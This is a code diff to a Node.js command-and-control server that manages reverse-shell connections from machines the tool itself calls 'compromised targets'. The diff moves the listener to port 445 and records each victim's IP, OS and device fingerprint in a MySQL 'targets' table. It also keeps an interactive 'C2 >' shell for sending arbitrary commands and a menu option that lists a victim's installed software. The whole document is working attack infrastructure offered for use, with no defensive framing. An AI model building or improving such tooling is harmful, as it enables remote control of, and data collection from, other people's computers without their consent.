@@ -1,6 +1,56 @@
 const net = require("net");
 const readline = require("readline");
 const colors = require("colors");
+const mysql = require("promise-mysql");
+const config = require("./config/db/helix.json");
+
+(async () => {
+    const isAdmin = (await import("is-admin")).default;
+
+    const isRoot = process.getuid && process.getuid() === 0;
+
+    const checkAdminRights = async () => {
+        const admin = await isAdmin();
+
+        if (!admin && !isRoot) {
+            console.error("This application must be run with administrative privileges.".red);
+            process.exit(1);
+        } else if (isRoot) {
+            console.log("Running as root user.".green);
+        } else {
+            console.log("Running with administrative privileges.".green);
+        }
+    };
+
+    await checkAdminRights();
+})();
+
+
+
+let dbConnection;
+
+async function initDB() {
+    try {
+        dbConnection = await mysql.createConnection(config);
+    } catch (err) {
+        console.error("Database connection failed: ", err.message);
+    }
+}
+
+async function insertClientData(clientId, deviceFingerprint, clientAddress, os, connectionTime) {
+    const query = `
+        INSERT INTO targets (id, device_finger_print, ip, os, connection_time) 
+        VALUES (?, ?, ?, ?, ?)
+    `;
+    
+    try {
+        await dbConnection.query(query, [clientId, deviceFingerprint, clientAddress, os, connectionTime]);
+    } catch (err) {
+        console.error("Failed to insert client data: ", err.message);
+    }
+}
+
+initDB();
 
 let clients = {};
 let clientIdCounter = 0;
@@ -25,11 +75,15 @@ function printHeader() {
     console.log(header.green);
 }
 
-function setupListener(port = 1337) {
+function setupListener(port = 445) {
     server = net.createServer((socket) => {
         const clientId = clientIdCounter++;
         const clientAddress = socket.remoteAddress.replace("::ffff:", "");
         const connectionTime = new Date();
+        
+        let os = "Unknown OS";
+        let deviceFingerprint = "";
+        let dataInserted = false;
 
         clients[clientId] = {
             socket: socket,
@@ -41,14 +95,30 @@ function setupListener(port = 1337) {
 
         console.log(`Client ${clientId} connected from IP: ${clientAddress}`);
 
+        
         socket.on("data", (data) => {
             const response = data.toString().trim();
-            if (response.length > 0) {
-                clients[clientId].data += response + "\n";
-                // Output response if in interactive mode
-                if (clients[clientId].interactiveMode) {
-                    process.stdout.write(`${response}\n> `); // `\nClient ${clientId} response: ${response}\n> `
-                }
+            
+            
+            if (response.includes("OS:")) {
+                os = response.match(/OS: (.+)/)[1];
+            }
+            if (response.match(/\b[0-9A-F]{4}_.+/)) {
+                deviceFingerprint = response;
+            }
+        
+            clients[clientId].data += response + "\n";
+        
+            
+            if (!dataInserted) {
+                insertClientData(clientId, deviceFingerprint, clientAddress, os, connectionTime);
+                dataInserted = true;
+            }
+        
+            
+            if (clients[clientId].interactiveMode) {
+                
+                process.stdout.write(`${response}\nC2 > `);
             }
         });
 
@@ -66,6 +136,7 @@ function setupListener(port = 1337) {
         console.log(`TCP server is listening on port ${port}`);
     });
 }
+
 
 function killListener() {
     if (server) {
@@ -102,12 +173,12 @@ function getClientInfo(clientId) {
 function interactWithClient(clientId) {
     if (clients[clientId]) {
         console.log(`\nEntering interactive shell with client ${clientId}...`);
-        clients[clientId].interactiveMode = true; // Set interactive mode
+        clients[clientId].interactiveMode = true;
 
         const rl = readline.createInterface({
             input: process.stdin,
             output: process.stdout,
-            prompt: "> "
+            prompt: "C2 > "
         });
 
         rl.prompt();
@@ -117,76 +188,37 @@ function interactWithClient(clientId) {
                 clients[clientId].interactiveMode = false;
                 console.log(`Exiting interaction with client ${clientId}...`);
                 rl.close();
-                displayMenu(); // Go back to menu after exiting
+                displayMenu();
             } else {
                 if (clients[clientId]) {
-                    clients[clientId].socket.write(command + "\n"); // Send command to client
+                    clients[clientId].socket.write(command + "\n");
+                    process.stdout.write(`Sent: ${command}\n`);
                 } else {
                     console.log(`Client ${clientId} is no longer connected.`);
                 }
-                rl.prompt(); // Keep the prompt open for further commands
+                rl.prompt();
             }
         });
 
+        
         rl.on("close", () => {
             clients[clientId].interactiveMode = false;
-            displayMenu(); // Return to menu after closing
+            console.log("\nExited interactive shell.");
+            displayMenu();
         });
     } else {
         console.log("Invalid client ID or client not connected.");
-        displayMenu(); // Return to menu if invalid client ID
+        displayMenu();
     }
 }
 
-function connectToBindShell(clientIP, port = 1338) {
-    const socket = new net.Socket();
-
-    socket.connect(port, clientIP, () => {
-        console.log(`Connected to client"s bind shell at ${clientIP}:${port}`);
-        const clientId = clientIdCounter++;
-        const connectionTime = new Date();
-
-        clients[clientId] = {
-            socket: socket,
-            clientAddress: clientIP,
-            connectionTime: connectionTime,
-            data: "",
-            interactiveMode: false
-        };
-
-        // Define socket event handlers within the connect callback
-        socket.on("data", (data) => {
-            const response = data.toString().trim();
-            if (response.length > 0) {
-                clients[clientId].data += response + "\n";
-                if (clients[clientId].interactiveMode) {
-                    process.stdout.write(`\nClient ${clientId} response: ${response}\n> `);
-                }
-            }
-        });
-
-        socket.on("end", () => {
-            console.log(`Client ${clientId} disconnected.`);
-            delete clients[clientId];
-        });
-
-        socket.on("error", (err) => {
-            console.error(`Error with client ${clientId}: ${err.message}`);
-        });
-
-        // Do not call displayMenu here; let the user decide next steps
-    });
-
-    socket.on("error", (err) => {
-        console.error(`Error connecting to client"s bind shell: ${err.message}`);
-    });
-}
 
 
-function removeClient(clientId) {
+async function removeClient(clientId) {
     if (clients[clientId]) {
-        clients[clientId].socket.end(); // Gracefully close the socket
+        clients[clientId].socket.end();
         delete clients[clientId];
+        await dbConnection.query(`DELETE FROM targets WHERE id = ?`, [clientId]);
         console.log(`Client ${clientId} has been removed.`);
     } else {
         console.log("Invalid client ID.");
@@ -196,7 +228,7 @@ function removeClient(clientId) {
 function displayMenu() {
     printHeader();
     if (global.rl && !global.rl.closed) {
-        global.rl.close(); // Close existing readline interface if open
+        global.rl.close();
     }
     global.rl = readline.createInterface({
         input: process.stdin,
@@ -212,54 +244,45 @@ function displayMenu() {
     console.log(`    3) List compromised targets
     4) Interact with a target
     5) Show interaction logs
-    6) Bind to client
-    7) List running apps on a client
-    8) Remove connected client`)
+    6) List running apps on a client
+    7) Remove connected client`)
     console.log(`
-    9) Exit\n`.red);
+    8) Exit\n`.red);
 
     global.rl.question("> ", (choice) => {
         switch (choice.trim()) {
             case "1":
                 setupListener();
-                waitForUserInput(rl);
+                waitForUserInput(global.rl);
                 break;
             case "2":
                 killListener();
-                waitForUserInput(rl);
+                waitForUserInput(global.rl);
                 break;
             case "3":
                 listClients();
-                waitForUserInput(rl);
+                waitForUserInput(global.rl);
                 break;
             case "4":
-                rl.question("Enter client ID to interact with: ", (clientId) => {
-                    rl.close();
+                global.rl.question("Enter client ID to interact with: ", (clientId) => {
+                    global.rl.close();
                     interactWithClient(clientId);
                 });
                 break;
             case "5":
-                rl.question("Enter client ID to get interaction logs for: ", (clientId) => {
+                global.rl.question("Enter client ID to get interaction logs for: ", (clientId) => {
                     getClientInfo(clientId);
-                    waitForUserInput(rl);
+                    waitForUserInput(global.rl);
                 });
                 break;
             case "6":
-                rl.question("Enter client IP to bind shell: ", (clientIP) => {
-                    rl.close();
-                    connectToBindShell(clientIP.trim());
-                });
-                break;
-            case "7":
-                rl.question("Enter client ID for installed application list: ", (clientId) => {
+                global.rl.question("Enter client ID for installed application list: ", (clientId) => {
                     if (clients[clientId]) {
                         console.log(`Fetching installed applications list for Client ${clientId}...`);
                         
-                        // Send the command to the client to list installed apps
                         clients[clientId].socket.write("wmic product get name\n");
                         
-                        // Wait for the response and handle it
-                        clients[clientId].interactiveMode = true; // Enable interactive mode to capture response
+                        clients[clientId].interactiveMode = true;
             
                         const waitForOutput = readline.createInterface({
                             input: process.stdin,
@@ -268,31 +291,31 @@ function displayMenu() {
             
                         waitForOutput.question("\n", () => {
                             waitForOutput.close();
-                            clients[clientId].interactiveMode = false; // Disable interactive mode
-                            displayMenu(); // Return to the main menu
+                            clients[clientId].interactiveMode = false;
+                            displayMenu();
                         });
 
                     } else {
                         console.log("Invalid client ID or client not connected.");
-                        waitForUserInput(rl);
+                        waitForUserInput(global.rl);
                     }
                 });
                 break;
-            case "8":
-                rl.question("Enter client ID to remove: ", (clientId) => {
+            case "7":
+                global.rl.question("Enter client ID to remove: ", (clientId) => {
                     removeClient(clientId);
-                    waitForUserInput(rl);
+                    waitForUserInput(global.rl);
                 });
                 break;
-            case "9":
+            case "8":
                 console.log("Exiting...");
-                rl.close();
+                global.rl.close();
                 if (server) server.close();
                 process.exit(0);
                 break;
             default:
                 console.log("Invalid choice. Please try again.");
-                waitForUserInput(rl);
+                waitForUserInput(global.rl);
                 break;
         }
     });
